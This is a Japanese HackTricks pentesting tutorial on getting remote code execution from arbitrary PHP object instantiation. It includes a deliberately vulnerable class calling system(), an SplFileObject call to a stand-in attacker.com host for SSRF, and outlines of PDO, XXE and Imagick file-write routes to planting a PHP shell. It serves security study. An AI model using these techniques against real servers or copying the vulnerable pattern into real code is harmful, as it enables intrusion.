# PHP - RCEオブジェクト作成の乱用: new $\_GET\["a"]\($\_GET\["b"])

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクション

- [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう

- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください。**

</details>

## はじめに

`new $_GET["a"]($_GET["b"])`のように任意のオブジェクトを作成できる状況では、RCEを取得することができるかもしれません。[**この解説**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)では、RCEを取得するためのさまざまな方法が公開されています。

## カスタムクラスまたはオートローディングによるRCE

構文`new $a($b)`では、**変数`$a`はオブジェクトが作成されるクラス名**を表し、変数**`$b`はオブジェクトのコンストラクタに渡される最初の引数**を表します。

`$a`と`$b`がGET/POSTから取得される場合、それらは**文字列または文字列の配列**である可能性があります。JSONや他の場所から取得される場合、オブジェクトやブール値などの**他の型**を持つ可能性があります。

次の例を考えてみましょう：
```php
class App {
function __construct ($cmd) {
system($cmd);
}
}

# Additionally, in PHP < 8.0 a constructor might be defined using the name of the class
class App2 {
function App2 ($cmd) {
system($cmd);
}
}

# Vulnerable code
$a = $_GET['a'];
$b = $_GET['b'];

new $a($b);
```
このコードでは、`$a`を`App`または`App2`に設定し、`$b`を`uname -a`に設定することができます。その後、`uname -a`コマンドが実行されます。

アプリケーションにこのような攻撃可能なクラスがない場合、または必要なクラスが脆弱なコードによって含まれていない別のファイルにある場合、オートローディング関数を確認することができます。

**オートローディング関数**は、`spl_autoload_register`を使用してコールバックを登録するか、`__autoload`を定義することで設定されます。これらの関数は、不明なクラスのインスタンスが作成されようとしているときに呼び出されます。
```php
# An example of an autoloading function
spl_autoload_register(function ($class_name) {
include './../classes/' . $class_name . '.php';
});

# An example of an autoloading function, works only in PHP < 8.0
function __autoload($class_name) {
include $class_name . '.php';
};

# Calling spl_autoload_register with no arguments enables the default autoloading function, which includes lowercase($classname) + .php/.inc from include_path
spl_autoload_register();
```
PHPのバージョンとオートローディングのコードによっては、オートローディングを介してリモートコード実行を行う方法が存在する場合があります。

## 組み込みクラスによるRCE

カスタムクラスとオートローディングがない場合、**組み込みのPHPクラスのみ**に頼ることができます。

組み込みのPHPクラスは100から200個あります。その数はPHPのバージョンとインストールされている拡張によって異なります。組み込みクラスは、`get_declared_classes`関数を使用してカスタムクラスと共にリストアップすることができます。
```php
var_dump(get_declared_classes());
```
有用なコンストラクタを持つクラスは、[リフレクションAPI](https://www.php.net/manual/en/book.reflection.php)を使用して見つけることができます。

リフレクションAPIを使用してコンストラクタとそのパラメータを表示する方法: [https://3v4l.org/2JEGF](https://3v4l.org/2JEGF)\


![](https://swarm.ptsecurity.com/wp-content/uploads/2022/07/2.png)

もし、**複数のコンストラクタパラメータを制御し、その後任意のメソッドを呼び出す**ことができる場合、リモートコード実行を行うための多くの方法があります。しかし、**1つのパラメータしか渡せず、作成されたオブジェクトに対して何の呼び出しも行わない**場合、ほとんど何もできません。

`new $a($b)`から何かを取得する方法は、私が知っているのは3つだけです。

### **SSRF + Pharデシリアライズ**

`SplFileObject`クラスは、任意のローカルまたはリモートURLへの接続を許可するコンストラクタを実装しています。
```
new SplFileObject('http://attacker.com/');
```
これにより、SSRF（Server-Side Request Forgery）が可能になります。さらに、PHP < 8.0のSSRFは、Pharプロトコルを使用した手法によって逆シリアル化に変換される可能性があります。

### **PDOの悪用**

PDOクラスにはもう1つ興味深いコンストラクタがあります：
```php
new PDO("sqlite:/tmp/test.txt")
```
`PDO`のコンストラクタはDSN文字列を受け入れ、**インストールされたデータベース拡張機能**を使用して**ローカルまたはリモートのデータベースに接続**することができます。たとえば、SQLite拡張機能は空のファイルを作成できます。

### **SoapClient/SimpleXMLElement XXE**

PHP ≤ 5.3.22および≤ 5.4.12では、SoapClientのコンストラクタは**XXEに対して脆弱**でした。SimpleXMLElementのコンストラクタもXXEに対して脆弱でしたが、libxml2 < 2.9が必要でした。

## Imagick拡張を使用したRCE

攻撃しようとしている**プロジェクト**の**依存関係**をチェックすると、新しいクラスが見つかる場合があります。これらのクラスを**新しいオブジェクトを作成してコマンドを実行するために悪用**することができます。この場合、**Imagick**がその目的に役立つことがわかりました。

### VIDパーサー

VIDパーサーを使用すると、ファイルシステム内の任意のパスに任意のコンテンツを書き込むことができます。これにより、攻撃者はウェブページからアクセス可能なフォルダにPHPシェルを書き込み、RCEを取得することができます。

![](<../../../.gitbook/assets/image (157) (3).png>)

#### VIDパーサー+ファイルのアップロード

PHPにファイルがアップロードされると、一時的に`/tmp/phpXXXXXX`に保存されます。ImagickのVIDパーサーは**msl**プロトコルを使用して、ファイルパスにワイルドカードを指定できます（アップロードされた一時ファイルに簡単にアクセスできるため）、そしてそれを**任意の場所にコピー**することができます。\
これはファイルシステム内での任意のファイル書き込みを取得する別の方法です。

![](<../../../.gitbook/assets/image (159).png>)

### PHPクラッシュ+ブルートフォース

[**元の記事**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)では、**特定の内容のファイルをアップロード**し、サーバーがそのファイルを削除する前に**クラッシュさせ**、その後一時ファイルの名前を**ブルートフォース**して**Imagickが任意のPHPコードを実行**する方法が説明されています。

ただし、この**クラッシュトリック**は、古いバージョンのImageMagickでのみ**動作するようです**。

## 参考文献

* [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ企業で働いていますか？ HackTricksであなたの会社を宣伝したいですか？または、最新バージョンのPEASSを入手したり、HackTricksをPDFでダウンロードしたりしたいですか？ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！**

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。

- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォローしてください。**

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください。**

</details>
